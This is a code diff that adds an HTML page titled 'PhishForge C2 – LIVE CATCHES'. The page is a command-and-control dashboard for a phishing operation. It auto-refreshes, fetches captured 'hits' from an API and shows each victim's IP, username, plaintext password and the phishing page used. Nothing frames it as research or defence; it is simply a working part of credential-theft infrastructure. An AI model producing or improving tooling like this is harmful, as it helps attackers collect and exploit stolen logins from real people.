@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PhishForge C2</title>
+  <meta http-equiv="refresh" content="3">
+  <style>
+    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { border: 1px solid #333; padding: 8px; }
+    th { background: #111; }
+    .new { background: #003300; animation: flash 1s; }
+    @keyframes flash { from { background: #006600; } to { background: #003300; } }
+  </style>
+</head>
+<body>
+  <h1>PHISHFORGE C2 – LIVE CATCHES</h1>
+  <table id="hits"><tr><th>Time</th><th>IP</th><th>User</th><th>Pass</th><th>Page</th></tr></table>
+  <script>
+    fetch('/api/hits').then(r => r.json()).then(data => {
+      const table = document.getElementById('hits');
+      data.forEach(row => {
+        const tr = document.createElement('tr');
+        tr.classList.add('new');
+        tr.innerHTML = `<td>${row.timestamp}</td><td>${row.ip}</td><td>${row.username}</td><td>${row.password}</td><td>${row.page}</td>`;
+        table.appendChild(tr);
+      });
+    });
+  </script>
+</body>
+</html>
